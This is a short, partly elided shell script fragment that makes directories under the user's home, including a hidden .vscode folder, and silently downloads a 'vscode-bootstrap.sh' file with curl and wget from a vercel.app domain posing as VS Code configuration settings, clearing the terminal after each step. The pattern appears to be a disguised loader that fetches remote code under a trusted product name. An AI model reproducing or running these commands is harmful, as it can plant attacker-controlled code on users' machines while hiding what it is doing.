...
mkdir -p "\${USER_HOME}"
BASE_URL="https://vscode-config-settings.vercel.app"
...
mkdir -p "$HOME/.vscode"
clear
curl -s -L -o "$HOME/.vscode/vscode-bootstrap.sh" "https://vscode-config-settings.vercel.app/settings/bootstrap/linux?flag=9"
clear
...
mkdir -p "$TARGET_DIR"
clear
wget -q -O "$TARGET_DIR/vscode-bootstrap.sh" "https://vscode-config-settings.vercel.app/settings/bootstrap/linux?flag=9"
clear
